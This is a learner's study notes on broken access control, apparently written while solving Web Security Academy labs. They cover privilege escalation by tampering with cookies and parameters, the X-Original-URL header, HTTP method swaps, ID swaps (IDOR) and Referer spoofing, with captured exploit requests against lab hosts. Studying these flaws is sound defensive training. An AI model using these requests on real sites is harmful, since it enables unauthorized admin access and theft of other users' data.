first we need to know some informations

**authentication**: confirms that the user is who they say they are

 **authorization**: confirms that the user has permission to do that actions he's asking for

**Session management:** identifies which subsequent HTTP requests are being made by that same usee

**Access control:** determines whether the user is allowed to carry out the action that they are attempting to perform.

**Access control security models:-**

is a set of access controls rules and restrictions of who can do what and how to classify them

1)**Programmatic access control**:

-controlled by coded matrices or tables says who can do what

-high flexibility since you can control every small details of users and groups

-key controlls only rely on the code and programming not just in the system

2) **Discretionary Access Control (DAC):**

-controlled only by the owner he can decide who can do what
-high flexibility cuz owner chooses every details by can be so complex

-key users can change their own roles only if they are owners

3)**Mandatory Access Control (MAC):**

-centrally controlled system users/owners can't change roles or restrictions 

-low flexibility duo to being so strict only system/security admins can change permissions
-used in military systems

4)**Role-based access control (RBAC):**

-controlled by the group or the rule you give to the person (admin/superuser/user)

-high flexibility easy to use cuz if a person leaves or joins the organization you simply can add or remove him from the group you dont have to set all his abilities from scratch 

-widely used cuz restrictions associated with groups not individuals 

-**Vertical Access Controls**: this mechanism restrict users by their types for example admin user can see the same page as normal user but he can see delete btn to delete users and he can see the dashboard btn to show all users, Vertical access controls can be more fine-grained implementations of security models designed to enforce business policies such as separation of duties and least privilege.

**Vertical privilege escalation**: A lower-privileged user (normal user) gains **higher-level privileges** (admin)

-**Horizontal Access Controls:** this mechanism users can't see the same thing each user sees only his own page and his own informations for example you go to my profile page you can only see your data and informations not other people informations and personal data or actions (e.g., a regular user accessing another regular user’s private messages).

**Horizontal privilege escalation**: A user stays at the **same privilege level** but accesses another user’s

**Context-Dependent Access Controls:** Context-dependent access controls prevent a user performing actions in the wrong order. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment.

**Examples of broken access controls:-**

**Vertical privilege escalation:** when a normal user can see and do actions that he wasn't supposed to be able to do for example going to the admin dashboard 

there's some pages you can find by using the url something like 
https://example.com`/robots.txt`  this page has different paths for the url that you can find always check it

let's start solving labs

1. visit `/robots.txt` and you will find 

```
User-agent: *
Disallow: /administrator-panel
```

he's trying to tell browsers to not curl this url but he literally gives it raw to you so go to `/administrator-panel` and now you have access to the admin dashboard and can remove users

1. you can also find sensitive url in the source code something like this 

`<script>var isAdmin = false;`

`if (isAdmin) {`

`var topLinksTag = document.getElementsByClassName("top-links")[0];`

`var adminPanelTag = document.createElement('a');`

`adminPanelTag.setAttribute('href', '/admin-817gpn');`

`adminPanelTag.innerText = 'Admin panel';`

`topLinksTag.append(adminPanelTag);`

`var pTag = document.createElement('p');pTag.innerText = '|';`

`topLinksTag.appendChild(pTag);`

`}</script>`

and then visit `/admin-817gpn`

1. some web applications add a hidden parameter of the role you can intercept the request and modify it using burp

```jsx
GET /admin HTTP/1.1
Host: [0aa7001b0387360f804da85f0028004b.web-security-academy.net](http://0aa7001b0387360f804da85f0028004b.web-security-academy.net/)
Cookie: session=sNSQm3CPXpMXbmfEEthLqjjqdI3X3Xjd; Admin=false
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

change Admin=false/ to Admin=true and forward the request 

1. some other websites give you role id like if it's 2 ure admin if it's 1 ure normal user and it sticks to you 
so in this lab you try to change the email of the user you send the request to repeater

`POST /my-account/change-email HTTP/2
Host: [0abc00e103cbd2b08277ba59009e0082.web-security-academy.net](http://0abc00e103cbd2b08277ba59009e0082.web-security-academy.net/)
Cookie: session=Ufd7tQ5z5MmIi1u0CEViFH6O5VTnmP9I
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 43
Origin: [https://0abc00e103cbd2b08277ba59009e0082.web-security-academy.net](https://0abc00e103cbd2b08277ba59009e0082.web-security-academy.net/)
Referer: https://0abc00e103cbd2b08277ba59009e0082.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers`

`{"[email":"test15@gmail.com](mailto:email%22:%22test15@gmail.com)"
}`

then get response like this 

HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 120

{
"username": "wiener",
"email": "[test15@gmail.com](mailto:test15@gmail.com)",
"apikey": "qnBa67nINe4Z5sy1Ir7DJYGqeh8cMCIR",
"roleid": 1
}

so you try to inject the "roleid": 1 parameter to the change email functionality so you change role id and email 
`{
"[email":"test15@gmail.com](mailto:email%22:%22test15@gmail.com)",
"roleid": 2
}`

and now the response have the roleid 2 and you have admin privileges

5.**URL-based access control can be circumvented** 
Some applications enforce access controls at the platform layer. they do this by restricting access to specific URLs and HTTP methods based on the user's role.This rule denies access to the `POST` method on the URL `/admin/deleteUser`, for users in the managers group. Various things can go wrong in this situation

so you need to check if the framework supports `X-Original-URL` or and `X-Rewrite-URL` this two headers can override the actual URL 
so first try to remove the url from the request and add X-Original-URL: /invalid to the request header just to check if it works 

```python
GET HTTP/2 HTTP/2
Host: [0a0500970418fd5980ce6c2c007400ba.web-security-academy.net](http://0a0500970418fd5980ce6c2c007400ba.web-security-academy.net/)
Cookie: session=I7xedmNXlFZZoIe6vZ9WJuFMx4hX9r20
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0500970418fd5980ce6c2c007400ba.web-security-academy.net/
X-Original-Url: /invalid
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

it should give you not found instead of Access denied 
if you replace it with /admin you will get the admin page in the response
now time to delete
add the /admin/delete to the header and give the parameters on the first like cuz you cant add parameters using that header and it will append it to the full url 
request should look like 

```python
GET /?username=carlos HTTP/2
Host: [0a0500970418fd5980ce6c2c007400ba.web-security-academy.net](http://0a0500970418fd5980ce6c2c007400ba.web-security-academy.net/)
Cookie: session=I7xedmNXlFZZoIe6vZ9WJuFMx4hX9r20
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0500970418fd5980ce6c2c007400ba.web-security-academy.net/
X-Original-Url: /admin/delete
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

1. get the request of upgrading  a user to an admin from the admin account 
-now log in as a normal user and take the session id 
-and then try to say the same upgrade request using the normal user session id 
-watch it saying unauthorized but what if we change the method into GET 
-change method from POST to GET and resend watch yourself making a Vertical privilege escalation  and the request got accepted
-this is likely because they instructed the request well to check for your authorization but they did it for the POST request not the GET request to

### **Horizontal privilege escalation**

Horizontal privilege escalation occurs if a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee can access the records of other employees as well as their own, then this is horizontal privilege escalation.

Horizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. For example, a user might access their own account page using the following URL:

```
https://insecure-website.com/myaccount?id=123
```

If an attacker modifies the `id` parameter value to that of another user, they might gain access to another user's account page, and the associated data and functions.

1. go to my account page 
-change the url id parameter to carlos should look like thi

```python

[c00ad03164a91844401e4008b0026.web-security-academy.net/my-account?id=carlos](https://0aac00ad03164a91844401e4008b0026.web-security-academy.net/my-account?id=carlos)
```

-watch urself getting in the another user profile page

1. sometimes developers use unpredictable  globally unique identifiers (GUIDs)
but it can be leaked in other places 
-get in the home page 
-find a post posted by carlos
-get in page source and find the Carlos userid or click to visit carlos page and find his id in the url
-use that id to replace ur id in my account page and get the api key
2. sometimes you try to replace the id with different id and it redirect you to the login page 
-try to intercept the get request of the my account page 
-change the id to carlos and click send 
-see the request has the data of carlos 
-you basically get logged in and then redirect to the log in page 
request should look like this 

```python
GET /my-account?id=carlos HTTP/2
Host: [0a0600b904e51557821b433200fa00b6.web-security-academy.net](http://0a0600b904e51557821b433200fa00b6.web-security-academy.net/)
Cookie: session=mNmvKNObDG2EZv2zmtViht3hX3nLOZ2s
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

1. **Horizontal to vertical privilege escalation**
sometimes **you can get vertical privilege escalation using horizontal escalation** 
    
    -get into my profile page
    -change the parameter id to /administrator  (horizontal escalation)
    
    -get the request on burp or right click and view page sorce get the admin page
    -log in as admin using that password (vertical escalation)
    -delete carlos account using the dashboard 
    
2. here lets try to download a chat that we dont have access to (carlos history chat)
-send a message and open burp and press view transcript
-find theGET request gets send to get you the that chat 
-you will find a the url in get request looks like`/download-transcript/2.txt` 
-change the file name to 1.txt in the url and hit send you will get the history chat for carlos 
request should look like this 

```python
GET /download-transcript/1.txt HTTP/2
Host: [0a09009803e3401a8020bc63004600a7.web-security-academy.net](http://0a09009803e3401a8020bc63004600a7.web-security-academy.net/)
Cookie: session=nPZv5yUjD9s6OGvKIhlkkypjmzte3jlX
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a09009803e3401a8020bc63004600a7.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

1. **Multi-step process with no access control on one step**

well some developers apply 2 steps to upgrade a normal user into an admin 
so they do their best to secure the first step but the second step is not secured enough
-go to admin account and press upgrade user //first secured request
-then it will ask you are you sure ? press YES //the second unsecured request
-go to a normal user account and use his session id to upgrade urself using the second unsecured request
request should look like 

```python
POST /admin-roles HTTP/2
Host: [0a5e00ef03977a2883ba5a8100a100ed.web-security-academy.net](http://0a5e00ef03977a2883ba5a8100a100ed.web-security-academy.net/)
Cookie: session=96BWlWOJnpzzSHGv2AM8o43TQG15DTMX
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: [https://0a5e00ef03977a2883ba5a8100a100ed.web-security-academy.net](https://0a5e00ef03977a2883ba5a8100a100ed.web-security-academy.net/)
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5e00ef03977a2883ba5a8100a100ed.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
action=upgrade&confirmed=true&username=wiener
```

13.

### **Referer-based access control**

Some websites base access controls on the `Referer` header submitted in the HTTP request. The `Referer` header can be added to requests by browsers to indicate which page initiated a request.

For example, an application robustly enforces access control over the main administrative page at `/admin`, but for sub-pages such as `/admin/deleteUser` only inspects the `Referer` header. If the `Referer` header contains the main `/admin` URL, then the request is allowed.

In this case, the `Referer` header can be fully controlled by an attacker. This means that they can forge direct requests to sensitive sub-pages by supplying the required `Referer` header, and gain unauthorized access.

-log in as admin 
-upgrade a user and get the request
-get session of normal user 
-replace the session of normal user with the admin session
-check that if you remove the referer header the request doesnt get accepted
-click send 
that means the website rely on referer header on Authorization which is not right cuz headers are under attacker contorl
